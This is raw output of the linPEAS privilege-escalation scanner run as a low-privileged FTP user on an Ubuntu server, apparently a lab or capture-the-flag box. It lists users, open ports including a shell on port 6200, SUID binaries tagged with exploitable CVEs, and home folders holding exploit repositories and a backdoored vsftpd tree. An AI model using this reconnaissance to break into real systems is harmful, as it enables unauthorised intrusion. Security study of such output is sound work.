link-local 169.254.0.0
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 157.90.235.13  netmask 255.255.255.255  broadcast 0.0.0.0
        inet6 2a01:4f8:1c1e:e168::1  prefixlen 64  scopeid 0x0<global>
        inet6 fe80::9400:1ff:fe52:97e4  prefixlen 64  scopeid 0x20<link>
        ether 96:00:01:52:97:e4  txqueuelen 1000  (Ethernet)
        RX packets 486023  bytes 32898541 (32.8 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 486040  bytes 26424059 (26.4 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 100  bytes 7914 (7.9 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 100  bytes 7914 (7.9 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0


╔══════════╣ Active Ports
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#open-ports
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:6200            0.0.0.0:*               LISTEN      833/sh              
tcp6       0      0 :::2121                 :::*                    LISTEN      619/vsftpd          
tcp6       0      0 :::\x1b[0m22                   :::*                    LISTEN      -                   

╔══════════╣ Can I sniff with tcpdump?
No



                                         ╔═══════════════════╗
═════════════════════════════════════════╣ Users Information ╠═════════════════════════════════════════
                                         ╚═══════════════════╝
╔══════════╣ My user
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#users
uid=1001(ftpuser) gid=1001(ftpuser) groups=1001(ftpuser)

╔══════════╣ Do I have PGP keys?
/usr/bin/gpg
netpgpkeys Not Found
netpgp Not Found

╔══════════╣ Checking 'sudo -l', /etc/sudoers, and /etc/sudoers.d
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid

╔══════════╣ Checking sudo tokens
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#reusing-sudo-tokens
ptrace protection is enabled (1)
gdb wasn't found in PATH, this might still be vulnerable but linpeas won't be able to check it

╔══════════╣ Checking Pkexec policy
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe#pe-method-2

[Configuration]
AdminIdentities=unix-user:0
[Configuration]
AdminIdentities=unix-group:sudo;unix-group:admin

╔══════════╣ Superusers
root:x:0:0:root:/root:/bin/bash

╔══════════╣ Users with console
ftpuser:x:1001:1001::/home/ftpuser:/bin/sh
oscar:x:1000:1000:,,,:/home/oscar:/bin/bash
root:x:0:0:root:/root:/bin/bash

╔══════════╣ All users & groups
uid=0(root) gid=0(root) groups=0(root)
uid=1000(oscar) gid=1000(oscar) groups=1000(oscar),27(sudo)
uid=1001(ftpuser) gid=1001(ftpuser) groups=1001(ftpuser)
uid=100(systemd-network) gid=102(systemd-network) groups=102(systemd-network)
uid=101(systemd-resolve) gid=103(systemd-resolve) groups=103(systemd-resolve)
uid=102(systemd-timesync) gid=104(systemd-timesync) groups=104(systemd-timesync)
uid=103(messagebus) gid=106(messagebus) groups=106(messagebus)
uid=104(syslog) gid=110(syslog) groups=110(syslog),4(adm),5(tty)
uid=105(_apt) gid=65534(nogroup) groups=65534(nogroup)
uid=106(tss) gid=111(tss) groups=111(tss)
uid=107(uuidd) gid=112(uuidd) groups=112(uuidd)
uid=108(tcpdump) gid=113(tcpdump) groups=113(tcpdump)
uid=109(landscape) gid=115(landscape) groups=115(landscape)
uid=10(uucp) gid=10(uucp) groups=10(uucp)
uid=110(pollinate) gid=1(daemon\x1b[0m) groups=1(daemon\x1b[0m)
uid=111(usbmux) gid=46(plugdev) groups=46(plugdev)
uid=112(sshd) gid=65534(nogroup) groups=65534(nogroup)
uid=113(ftp) gid=118(ftp) groups=118(ftp)
uid=13(proxy) gid=13(proxy) groups=13(proxy)
uid=1(daemon\x1b[0m) gid=1(daemon\x1b[0m) groups=1(daemon\x1b[0m)
uid=2(bin) gid=2(bin) groups=2(bin)
uid=33(www-data) gid=33(www-data) groups=33(www-data)
uid=34(backup) gid=34(backup) groups=34(backup)
uid=38(list) gid=38(list) groups=38(list)
uid=39(irc) gid=39(irc) groups=39(irc)
uid=3(sys) gid=3(sys) groups=3(sys)
uid=41(gnats) gid=41(gnats) groups=41(gnats)
uid=4(sync) gid=65534(nogroup) groups=65534(nogroup)
uid=5(games) gid=60(games) groups=60(games)
uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)
uid=6(man) gid=12(man) groups=12(man)
uid=7(lp) gid=7(lp) groups=7(lp)
uid=8(mail) gid=8(mail) groups=8(mail)
uid=998(lxd) gid=100(users) groups=100(users)
uid=999(systemd-coredump) gid=999(systemd-coredump) groups=999(systemd-coredump)
uid=9(news) gid=9(news) groups=9(news)

╔══════════╣ Login now
 18:14:01 up 12 min,  0 users,  load average: 0.33, 0.11, 0.07
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT

╔══════════╣ Last logons
reboot   system boot  Wed Jun 15 01:46:09 2022 - Wed Jun 15 02:01:01 2022  (00:14)     0.0.0.0
reboot   system boot  Wed Jun 15 01:31:09 2022 - Wed Jun 15 01:46:02 2022  (00:14)     0.0.0.0
reboot   system boot  Wed Jun 15 01:16:09 2022 - Wed Jun 15 01:31:02 2022  (00:14)     0.0.0.0
reboot   system boot  Wed Jun 15 01:01:09 2022 - Wed Jun 15 01:16:02 2022  (00:14)     0.0.0.0
reboot   system boot  Wed Jun 15 00:46:09 2022 - Wed Jun 15 01:01:02 2022  (00:14)     0.0.0.0
reboot   system boot  Wed Jun 15 00:31:09 2022 - Wed Jun 15 00:46:02 2022  (00:14)     0.0.0.0
reboot   system boot  Wed Jun 15 00:16:09 2022 - Wed Jun 15 00:31:02 2022  (00:14)     0.0.0.0
reboot   system boot  Wed Jun 15 00:01:09 2022 - Wed Jun 15 00:16:02 2022  (00:14)     0.0.0.0

wtmp begins Wed Jun 15 00:01:02 2022

╔══════════╣ Last time logon each user
Username         Port     From             Latest
root             tty1                      Wed Jun  1 16:52:53 +0200 2022
oscar            pts/0    79.149.44.157    Wed Jun 15 16:47:53 +0200 2022
ftpuser          pts/0    81.36.194.25     Fri Oct  8 23:34:40 +0200 2021

╔══════════╣ Do not forget to test 'su' as any other user with shell: without password and with their names as password (I can't do it...)

╔══════════╣ Do not forget to execute 'sudo -l' without password or with valid password (if you know it)!!



                                       ╔══════════════════════╗
═══════════════════════════════════════╣ Software Information ╠═══════════════════════════════════════
                                       ╚══════════════════════╝
╔══════════╣ Useful software
/usr/bin/base64
/usr/bin/curl
/usr/bin/gcc
/usr/bin/make
/usr/bin/nc
/usr/bin/netcat
/usr/bin/perl
/usr/bin/ping
/usr/bin/python3
/usr/bin/sudo
/usr/bin/wget

╔═══════\\x95\x90══╣ Installed Compilers
ii  gcc                             4:9.3.0-1ubuntu2                      amd64        GNU C compiler
ii  gcc-9                           9.4.0-1ubuntu1~20.04.1                amd64        GNU C compiler
/usr/bin/gcc

╔══════════╣ Searching mysql credentials and exec

╔══════════╣ Analyzing Rsync Files (limit 70)
-rw-r--r-- 1 root root 1044 Feb  7 23:46 /usr/share/doc/rsync/examples/rsyncd.conf
[ftp]
    comment = public archive
    path = /var/www/pub
    use chroot = yes
    lock file = /var/lock/rsyncd
    read only = yes
    list = yes
    uid = nobody
    gid = nogroup
    strict modes = yes
    ignore errors = no
    ignore nonreadable = yes
    transfer logging = no
    timeout = 600
    refuse options = checksum dry-run
    dont compress = *.gz *.tgz *.zip *.z *.rpm *.deb *.iso *.bz2 *.tbz


╔══════════╣ Analyzing Ldap Files (limit 70)
The password hash is from the {SSHA} to 'structural'
drwxr-xr-x 2 root root 4096 Jun 12 06:27 /etc/ldap


╔══════════╣ Searching ssl/ssh files
PermitRootLogin yes
ChallengeResponseAuthentication no
UsePAM yes
PasswordAuthentication yes
══╣ Some certificates were found (out limited):
/etc/pki/fwupd/LVFS-CA.pem
/etc/pki/fwupd-metadata/LVFS-CA.pem
/etc/pollinate/entropy.ubuntu.com.pem
/var/lib/fwupd/pki/client.pem
836PSTORAGE_CERTSBIN

gpg-connect-agent: no running gpg-agent - starting '/usr/bin/gpg-agent'
gpg-connect-agent: waiting for the agent to come up ... (5s)
gpg-connect-agent: connection to agent established
══╣ Writable ssh and gpg agents
/etc/systemd/user/sockets.target.wants/gpg-agent-extra.socket
/etc/systemd/user/sockets.target.wants/gpg-agent-browser.socket
/etc/systemd/user/sockets.target.wants/gpg-agent.socket
/etc/systemd/user/sockets.target.wants/gpg-agent-ssh.socket
══╣ Some home ssh config file was found
/usr/share/openssh/sshd_config
Include /etc/ssh/sshd_config.d/*.conf
ChallengeResponseAuthentication no
UsePAM yes
X11Forwarding yes
PrintMotd no
AcceptEnv LANG LC_*
Subsystem    sftp    /usr/lib/openssh/sftp-server

══╣ /etc/hosts.allow file found, trying to read the rules:
/etc/hosts.allow


Searching inside /etc/ssh/ssh_config for interesting info
Include /etc/ssh/ssh_config.d/*.conf
Host *
    SendEnv LANG LC_*
    HashKnownHosts yes
    GSSAPIAuthentication yes

╔══════════╣ Analyzing PAM Auth Files (limit 70)
drwxr-xr-x 2 root root 4096 Jun 13 07:24 /etc/pam.d
-rw-r--r-- 1 root root 2133 Jul 23  2021 /etc/pam.d/sshd




╔══════════╣ Searching tmux sessions
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#open-shell-sessions
tmux 3.0a


/tmp/tmux-1001
╔══════════╣ Analyzing Cloud Init Files (limit 70)
-rw-r--r-- 1 root root 3764 Sep 20  2021 /etc/cloud/cloud.cfg
     lock_passwd: True

╔══════════╣ Analyzing Keyring Files (limit 70)
drwxr-xr-x 2 root root 4096 Sep 13  2021 /usr/share/keyrings




╔══════════╣ Searching uncommon passwd files (splunk)
passwd file: /etc/pam.d/passwd
passwd file: /etc/passwd
passwd file: /usr/share/bash-completion/completions/passwd
passwd file: /usr/share/lintian/overrides/passwd

╔══════════╣ Analyzing Github Files (limit 70)
drwx------ 3 ftpuser ftpuser 4096 Jun 15 17:31 /home/ftpuser/2/poc-cve-2021-4034/.github
drwx------ 3 ftpuser ftpuser 4096 Oct 19  2021 /home/ftpuser/.cache/.a/PEASS-ng/.github



drwx------ 8 ftpuser ftpuser 4096 Jun 15 16:38 /home/ftpuser/1/CVE-2021-4034/.git
drwx------ 8 ftpuser ftpuser 4096 Jun 15 17:31 /home/ftpuser/2/poc-cve-2021-4034/.git
drwx------ 8 ftpuser ftpuser 4096 Oct 19  2021 /home/ftpuser/.cache/.a/PEASS-ng/.git
drwx------ 8 ftpuser ftpuser 4096 Jun 15 10:50 /home/ftpuser/.cache/.a/Sudo-1.8.31-Root-Exploit/CVE-2021-3156/CVE-2021-3156/.git
drwx------ 8 ftpuser ftpuser 4096 Oct 19  2021 /home/ftpuser/.cache/.a/Sudo-1.8.31-Root-Exploit/CVE-2021-3156/.git
drwx------ 8 ftpuser ftpuser 4096 Oct 19  2021 /home/ftpuser/.cache/.a/Sudo-1.8.31-Root-Exploit/.git
drwx------ 8 ftpuser ftpuser 4096 Jun 15 17:10 /home/ftpuser/CVE-2021-29155/.git
drwx------ 8 ftpuser ftpuser 4096 Jun 15 16:32 /home/ftpuser/CVE-2021-4034/.git
drwxrwxr-x 8 oscar oscar 4096 Oct  8  2021 /home/oscar/vsftpd-2.3.4-infected/.git

╔══════════╣ Analyzing PGP-GPG Files (limit 70)
/usr/bin/gpg
netpgpkeys Not Found
netpgp Not Found

-rw-r--r-- 1 root root 2794 Mar 29  2021 /etc/apt/trusted.gpg.d/ubuntu-keyring-2012-cdimage.gpg
-rw-r--r-- 1 root root 1733 Mar 29  2021 /etc/apt/trusted.gpg.d/ubuntu-keyring-2018-archive.gpg
-rw------- 1 ftpuser ftpuser 1200 Oct 19  2021 /home/ftpuser/.gnupg/trustdb.gpg
-rw-r--r-- 1 root root 3267 Jan  6  2021 /usr/share/gnupg/distsigkey.gpg
-rw-r--r-- 1 root root 2274 Jul 27  2021 /usr/share/keyrings/ubuntu-advantage-cis.gpg
-rw-r--r-- 1 root root 2236 Jul 27  2021 /usr/share/keyrings/ubuntu-advantage-esm-apps.gpg
-rw-r--r-- 1 root root 2264 Jul 27  2021 /usr/share/keyrings/ubuntu-advantage-esm-infra-trusty.gpg
-rw-r--r-- 1 root root 2275 Jul 27  2021 /usr/share/keyrings/ubuntu-advantage-fips.gpg
-rw-r--r-- 1 root root 7399 Sep 18  2018 /usr/share/keyrings/ubuntu-archive-keyring.gpg
-rw-r--r-- 1 root root 6713 Oct 27  2016 /usr/share/keyrings/ubuntu-archive-removed-keys.gpg
-rw-r--r-- 1 root root 4097 Feb  6  2018 /usr/share/keyrings/ubuntu-cloudimage-keyring.gpg
-rw-r--r-- 1 root root 0 Jan 17  2018 /usr/share/keyrings/ubuntu-cloudimage-removed-keys.gpg
-rw-r--r-- 1 root root 1227 May 27  2010 /usr/share/keyrings/ubuntu-master-keyring.gpg
-rw-r--r-- 1 root root 2867 Feb 14  2020 /usr/share/popularity-contest/debian-popcon.gpg

drwx------ 3 ftpuser ftpuser 4096 Jun 15 18:14 /home/ftpuser/.gnupg

╔══════════╣ Analyzing Cache Vi Files (limit 70)

-rw------- 1 ftpuser ftpuser 2027 Jun 15 17:44 /home/ftpuser/.viminfo


╔══════════╣ Analyzing Postfix Files (limit 70)
-rw-r--r-- 1 root root 813 Feb  2  2020 /usr/share/bash-completion/completions/postfix


╔══════════╣ Analyzing Bind Files (limit 70)
-rw-r--r-- 1 root root 832 Feb  2  2020 /usr/share/bash-completion/completions/bind
-rw-r--r-- 1 root root 832 Feb  2  2020 /usr/share/bash-completion/completions/bind



╔══════════╣ Analyzing Other Interesting Files (limit 70)
-rw-r--r-- 1 root root 3771 Feb 25  2020 /etc/skel/.bashrc
-rw-r--r-- 1 ftpuser ftpuser 3771 Oct  8  2021 /home/ftpuser/.bashrc
-rw-r--r-- 1 oscar oscar 3771 Oct  8  2021 /home/oscar/.bashrc





-rw-r--r-- 1 root root 807 Feb 25  2020 /etc/skel/.profile
-rw-r--r-- 1 ftpuser ftpuser 807 Oct  8  2021 /home/ftpuser/.profile
-rw-r--r-- 1 oscar oscar 807 Oct  8  2021 /home/oscar/.profile



-rw-r--r-- 1 oscar oscar 0 Oct  8  2021 /home/oscar/.sudo_as_admin_successful



100  758k  100  758k    0     0  39702      0  0:00:19  0:00:19 --:--:--     0
                                         ╔═══════════════════╗
═════════════════════════════════════════╣ Interesting Files ╠═════════════════════════════════════════
                                         ╚═══════════════════╝
╔══════════╣ SUID - Check easy privesc, exploits and write perms
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid
-rwsr-xr-x 1 root root 23K Feb 21 14:58 /usr/lib/policykit-1/polkit-agent-helper-1
-rwsr-xr-x 1 root root 463K Jul 23  2021 /usr/lib/openssh/ssh-keysign
-rwsr-xr-- 1 root messagebus 51K Apr 29 14:03 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 44K Jul 15  2021 /usr/bin/newgrp  --->  HP-UX_10.20
-rwsr-xr-x 1 root root 31K Feb 21 14:58 /usr/bin/pkexec  --->  Linux4.10_to_5.1.17(CVE-2019-13272)/rhel_6(CVE-2011-1485)
-rwsr-sr-x 1 daemon daemon 55K Nov 12  2018 /usr/bin/at  --->  RTru64_UNIX_4.0g(CVE-2002-1614)
-rwsr-xr-x 1 root root 87K Jul 15  2021 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 67K Jul 15  2021 /usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)
-rwsr-xr-x 1 root root 67K Feb  7 15:33 /usr/bin/su
-rwsr-xr-x 1 root root 84K Jul 15  2021 /usr/bin/chfn  --->  SuSE_9.3/10
-rwsr-xr-x 1 root root 55K Feb  7 15:33 /usr/bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
-rwsr-xr-x 1 root root 163K Jan 19  2021 /usr/bin/sudo  --->  check_if_the_sudo_version_is_vulnerable
-rwsr-xr-x 1 root root 52K Jul 15  2021 /usr/bin/chsh
-rwsr-xr-x 1 root root 39K Feb  7 15:33 /usr/bin/umount  --->  BSD/Linux(08-1996)
-rwsr-xr-x 1 root root 39K Mar  7  2020 /usr/bin/fusermount

╔══════════╣ SGID
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid
-rwxr-sr-x 1 root utmp 15K Sep 30  2019 /usr/lib/x86_64-linux-gnu/utempter/utempter
-rwxr-sr-x 1 root shadow 83K Jul 15  2021 /usr/bin/chage
-rwxr-sr-x 1 root ssh 343K Jul 23  2021 /usr/bin/ssh-agent
-rwsr-sr-x 1 daemon daemon 55K Nov 12  2018 /usr/bin/at  --->  RTru64_UNIX_4.0g(CVE-2002-1614)
-rwxr-sr-x 1 root crontab 43K Feb 13  2020 /usr/bin/crontab
-rwxr-sr-x 1 root tty 35K Feb  7 15:33 /usr/bin/wall
-rwxr-sr-x 1 root tty 15K Mar 30  2020 /usr/bin/bsd-write
-rwxr-sr-x 1 root shadow 31K Jul 15  2021 /usr/bin/expiry
-rwxr-sr-x 1 root shadow 43K Sep 17  2021 /usr/sbin/pam_extrausers_chkpwd
-rwxr-sr-x 1 root shadow 43K Sep 17  2021 /usr/sbin/unix_chkpwd

╔══════════╣ Checking misconfigurations of ld.so
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#ld-so
/etc/ld.so.conf
include /etc/ld.so.conf.d/*.conf

/etc/ld.so.conf.d
  /etc/ld.so.conf.d/libc.conf
/usr/local/lib
  /etc/ld.so.conf.d/x86_64-linux-gnu.conf
/usr/local/lib/x86_64-linux-gnu
/lib/x86_64-linux-gnu
/usr/lib/x86_64-linux-gnu

╔══════════╣ Capabilities
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#capabilities
Current capabilities:
Current: =
CapInh:    0000000000000000
CapPrm:    0000000000000000
CapEff:    0000000000000000
CapBnd:    0000003fffffffff
CapAmb:    0000000000000000

Shell capabilities:
0x0000000000000000=
CapInh:    0000000000000000
CapPrm:    0000000000000000
CapEff:    0000000000000000
CapBnd:    0000003fffffffff
CapAmb:    0000000000000000

Files with capabilities (limited to 50):
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/bin/ping = cap_net_raw+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep

╔══════════╣ Users with capabilities
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#capabilities

╔══════════╣ Files with ACLs (limited to 50)
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#acls
files with acls in searched folders Not Found

╔══════════╣ .sh files in path
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#script-binaries-in-path
/usr/bin/rescan-scsi-bus.sh
/usr/bin/gettext.sh

╔══════════╣ Unexpected in root

╔══════════╣ Files (scripts) in /etc/profile.d/
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#profiles-files
total 36
drwxr-xr-x  2 root root 4096 Oct 18  2021 .
drwxr-xr-x 98 root root 4096 Jun 13 07:26 ..
-rw-r--r--  1 root root   96 Dec  5  2019 01-locale-fix.sh
-rw-r--r--  1 root root  729 Feb  2  2020 bash_completion.sh
-rw-r--r--  1 root root 1107 Nov  3  2019 gawk.csh
-rw-r--r--  1 root root  757 Nov  3  2019 gawk.sh
-rw-r--r--  1 root root 1557 Feb 17  2020 Z97-byobu.sh
-rwxr-xr-x  1 root root  873 Jan 18  2021 Z99-cloudinit-warnings.sh
-rwxr-xr-x  1 root root 3417 Jan 18  2021 Z99-cloud-locale-test.sh

╔══════════╣ Permissions in init, init.d, systemd, and rc.d
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#init-init-d-systemd-and-rc-d

═╣ Hashes inside passwd file? ........... No
═╣ Writable passwd file? ................ No
═╣ Credentials in fstab/mtab? ........... No
═╣ Can I read shadow files? ............. No
═╣ Can I read shadow plists? ............ No
═╣ Can I write shadow plists? ........... No
═╣ Can I read opasswd file? ............. No
═╣ Can I write in network-scripts? ...... No
═╣ Can I read root folder? .............. No

╔══════════╣ Searching root files in home dirs (limit 30)
/home/
/root/

╔══════════╣ Searching folders owned by me containing others files on it (limit 100)

╔══════════╣ Readable files belonging to root and readable by me but not world readable

╔══════════╣ Modified interesting files in the last 5mins (limit 100)
/var/log/syslog
/var/log/journal/8d88b196faf340e0978e59db648322a5/user-1001.journal
/var/log/journal/8d88b196faf340e0978e59db648322a5/system.journal
/var/log/auth.log
/var/log/btmp

╔══════════╣ Writable log files (logrotten) (limit 100)
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#logrotate-exploitation
logrotate 3.14.0

    Default mail command:       /usr/bin/mail
    Default compress command:   /bin/gzip
    Default uncompress command: /bin/gunzip
    Default compress extension: .gz
    Default state file path:    /var/lib/logrotate/status
    ACL support:                yes
    SELinux support:            yes

╔══════════╣ Files inside /home/ftpuser (limit 20)
total 64
drwxr-xr-x 10 ftpuser ftpuser 4096 Jun 15 17:46 .
drwxr-xr-x  4 root    root    4096 Oct  8  2021 ..
drwx------  3 ftpuser ftpuser 4096 Jun 15 16:38 1
drwx------  3 ftpuser ftpuser 4096 Jun 15 17:31 2
-rw-------  1 ftpuser ftpuser 1577 Jun 15 17:31 .bash_history
-rw-r--r--  1 ftpuser ftpuser  220 Oct  8  2021 .bash_logout
-rw-r--r--  1 ftpuser ftpuser 3771 Oct  8  2021 .bashrc
drwx------  3 ftpuser ftpuser 4096 Oct 19  2021 .cache
-rw-r--r--  1 ftpuser ftpuser    0 Oct  8  2021 .cloud-locale-test.skip
drwx------  3 ftpuser ftpuser 4096 Jun 15 17:10 CVE-2021-29155
drwx------  5 ftpuser ftpuser 4096 Jun 15 16:32 CVE-2021-4034
drwx------  3 ftpuser ftpuser 4096 Jun 15 18:14 .gnupg
drwxrwxr-x  3 ftpuser ftpuser 4096 Oct 11  2021 .local
-rw-r--r--  1 ftpuser ftpuser  257 Mar  4 19:04 .old_credentials.zip
-rw-r--r--  1 ftpuser ftpuser  807 Oct  8  2021 .profile
drwx------  2 ftpuser ftpuser 4096 Oct 13  2021 .ssh
-rw-------  1 ftpuser ftpuser 2027 Jun 15 17:44 .viminfo

╔══════════╣ Files inside others home (limit 20)
/home/oscar/.cloud-locale-test.skip
/home/oscar/vsftpd-2.3.4-infected/hash.c
/home/oscar/vsftpd-2.3.4-infected/readwrite.o
/home/oscar/vsftpd-2.3.4-infected/AUDIT
/home/oscar/vsftpd-2.3.4-infected/tunables.h
/home/oscar/vsftpd-2.3.4-infected/sysdeputil.o
/home/oscar/vsftpd-2.3.4-infected/REWARD
/home/oscar/vsftpd-2.3.4-infected/ssl.c
/home/oscar/vsftpd-2.3.4-infected/ftpcodes.h
/home/oscar/vsftpd-2.3.4-infected/vsftpver.h
/home/oscar/vsftpd-2.3.4-infected/ptracesandbox.h
/home/oscar/vsftpd-2.3.4-infected/.git/description
/home/oscar/vsftpd-2.3.4-infected/.git/packed-refs
/home/oscar/vsftpd-2.3.4-infected/.git/HEAD
/home/oscar/vsftpd-2.3.4-infected/.git/objects/pack/pack-1dd8de80350d3fde038e986ed1bc6435ba27acb1.idx
/home/oscar/vsftpd-2.3.4-infected/.git/objects/pack/pack-1dd8de80350d3fde038e986ed1bc6435ba27acb1.pack
/home/oscar/vsftpd-2.3.4-infected/.git/config
/home/oscar/vsftpd-2.3.4-infected/.git/index
/home/oscar/vsftpd-2.3.4-infected/.git/logs/HEAD
/home/oscar/vsftpd-2.3.4-infected/.git/logs/refs/heads/vsftpd_original

╔══════════╣ Searching installed mail applications

╔══════════╣ Mails (limit 50)

╔══════════╣ Backup folders

╔══════════╣ Backup files (limited 100)
-rw-r--r-- 1 root root 316 Jun 15 18:01 /run/blkid/blkid.tab.old
-rw-r--r-- 1 root root 2743 Feb  1  2021 /etc/apt/sources.list.curtin.old
-rw-r--r-- 1 root root 44048 Aug 31  2021 /usr/lib/x86_64-linux-gnu/open-vm-tools/plugins/vmsvc/libvmbackup.so
-rw-r--r-- 1 root root 1403 Sep 13  2021 /usr/lib/python3/dist-packages/sos/report/plugins/__pycache__/ovirt_engine_backup.cpython-38.pyc
-rw-r--r-- 1 root root 1775 Feb 25  2021 /usr/lib/python3/dist-packages/sos/report/plugins/ovirt_engine_backup.py
-rw-r--r-- 1 root root 2756 Feb 13  2020 /usr/share/man/man8/vgcfgbackup.8.gz
-rwxr-xr-x 1 root root 226 Feb 17  2020 /usr/share/byobu/desktop/byobu.desktop.old
-rw-r--r-- 1 root root 11886 Jun 13 07:24 /usr/share/info/dir.old
-rw-r--r-- 1 root root 392817 Feb  9  2020 /usr/share/doc/manpages/Changes.old.gz

╔══════════╣ Searching tables inside readable .db/.sql/.sqlite files (limit 100)
Found /var/lib/command-not-found/commands.db
Found /var/lib/fwupd/pending.db
Found /var/lib/PackageKit/transactions.db

 -> Extracting tables from /var/lib/command-not-found/commands.db (limit 20)


 -> Extracting tables from /var/lib/fwupd/pending.db (limit 20)




 -> Extracting tables from /var/lib/PackageKit/transactions.db (limit 20)





╔══════════╣ Web files?(output limit)

╔══════════╣ All hidden files (not in /sys/ or the ones listed in the previous check) (limit 70)
-rw-r--r-- 1 root root 9 Jun 15 18:01 /run/cloud-init/.instance-id
-rw-r--r-- 1 root root 2 Jun 15 18:01 /run/cloud-init/.ds-identify.result
-rw-r--r-- 1 ftpuser ftpuser 0 Oct  8  2021 /home/ftpuser/.cloud-locale-test.skip
-rw-r--r-- 1 ftpuser ftpuser 257 Mar  4 19:04 /home/ftpuser/.old_credentials.zip
-rw-r--r-- 1 ftpuser ftpuser 220 Oct  8  2021 /home/ftpuser/.bash_logout
-rw-r--r-- 1 oscar oscar 0 Oct  8  2021 /home/oscar/.cloud-locale-test.skip
-rw-r--r-- 1 oscar oscar 220 Oct  8  2021 /home/oscar/.bash_logout
-rw------- 1 root root 0 Feb  1  2021 /etc/.pwd.lock
-rw-r--r-- 1 root root 0 Sep 13  2021 /etc/skel/.cloud-locale-test.skip
-rw-r--r-- 1 root root 220 Feb 25  2020 /etc/skel/.bash_logout
-rw-r--r-- 1 landscape landscape 0 Feb  1  2021 /var/lib/landscape/.cleanup.user

╔══════════╣ Readable files inside /tmp, /var/tmp, /private/tmp, /private/var/at/tmp, /private/var/tmp, and backup folders (limit 70)
-rw-r--r-- 1 root root 3039 Oct 11  2021 /var/backups/apt.extended_states.2.gz
-rw-r--r-- 1 root root 3029 Oct  8  2021 /var/backups/apt.extended_states.3.gz
-rw-r--r-- 1 root root 135 Oct  8  2021 /var/backups/dpkg.statoverride.0
-rw-r--r-- 1 root root 2436 Jun 13 06:25 /var/backups/alternatives.tar.1.gz
-rw-r--r-- 1 root root 139 Sep 13  2021 /var/backups/dpkg.diversions.6.gz
-rw-r--r-- 1 root root 142 Oct  8  2021 /var/backups/dpkg.statoverride.1.gz
-rw-r--r-- 1 root root 139 Sep 13  2021 /var/backups/dpkg.diversions.2.gz
-rw-r--r-- 1 root root 150714 Oct 16  2021 /var/backups/dpkg.status.6.gz
-rw-r--r-- 1 root root 139 Sep 13  2021 /var/backups/dpkg.diversions.5.gz
-rw-r--r-- 1 root root 268 Sep 13  2021 /var/backups/dpkg.diversions.0
-rw-r--r-- 1 root root 151053 Mar  4 19:03 /var/backups/dpkg.status.4.gz
-rw-r--r-- 1 root root 2365 Oct  9  2021 /var/backups/alternatives.tar.2.gz
-rw-r--r-- 1 root root 150711 Oct 18  2021 /var/backups/dpkg.status.5.gz
-rw-r--r-- 1 root root 142 Oct  8  2021 /var/backups/dpkg.statoverride.2.gz
-rw-r--r-- 1 root root 139 Sep 13  2021 /var/backups/dpkg.diversions.4.gz
-rw-r--r-- 1 root root 27377 Jun 14 06:21 /var/backups/apt.extended_states.0
-rw-r--r-- 1 root root 142 Oct  8  2021 /var/backups/dpkg.statoverride.5.gz
-rw-r--r-- 1 root root 139 Sep 13  2021 /var/backups/dpkg.diversions.3.gz
-rw-r--r-- 1 root root 142 Oct  8  2021 /var/backups/dpkg.statoverride.6.gz
-rw-r--r-- 1 root root 151236 Jun 14 06:21 /var/backups/dpkg.status.1.gz
-rw-r--r-- 1 root root 3052 Jun 13 07:26 /var/backups/apt.extended_states.1.gz
-rw-r--r-- 1 root root 142 Oct  8  2021 /var/backups/dpkg.statoverride.3.gz
-rw-r--r-- 1 root root 139 Sep 13  2021 /var/backups/dpkg.diversions.1.gz
-rw-r--r-- 1 root root 151120 Jun 12 06:31 /var/backups/dpkg.status.2.gz
-rw-r--r-- 1 root root 51200 Jun 14 06:25 /var/backups/alternatives.tar.0
-rw-r--r-- 1 root root 592874 Jun 14 06:21 /var/backups/dpkg.status.0
-rw-r--r-- 1 root root 142 Oct  8  2021 /var/backups/dpkg.statoverride.4.gz
-rw-r--r-- 1 root root 151060 Jun 12 06:24 /var/backups/dpkg.status.3.gz

╔══════════╣ Interesting writable files owned by me or writable by everyone (not in Home) (max 500)
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-files
/dev/mqueue
/dev/shm
/etc/pam.d/vsftpd
/etc/vsftpd.banner
/etc/vsftpd.conf
/etc/vsftpd.userlist
/home/ftpuser
/run/lock
